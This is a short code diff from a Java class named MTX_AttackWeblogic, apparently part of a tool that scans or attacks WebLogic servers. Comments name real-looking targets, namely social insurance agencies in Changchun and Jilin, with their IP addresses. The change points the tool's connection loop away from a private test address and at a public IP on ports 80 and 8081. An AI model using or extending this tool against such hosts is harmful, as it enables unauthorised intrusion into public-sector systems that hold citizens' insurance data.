@@ -549,11 +549,11 @@ public class MTX_AttackWeblogic extends DoNmapResult
 			// 长春社会保险 222.168.33.108 9001
 			// 吉林省社会医疗保险管理局 http://www.jlyb.gov.cn/  124.42.10.247
 			String []a1 = 
-					"8084,8086,,8088,8089,8098,8099,8888,7001,8086,3938,1158,80"
+					"80,8081"
 					.split(",");
 			for(int i = 0; i < a1.length; i++)
 			{
-				ma.connSvr("192.168.10.199", a1[i], null, null);
+				ma.connSvr("125.91.96.226", a1[i], null, null);
 			}
 //			final MyExecutors met = MyExecutors.getInstance();
 //			final String []a1 = 
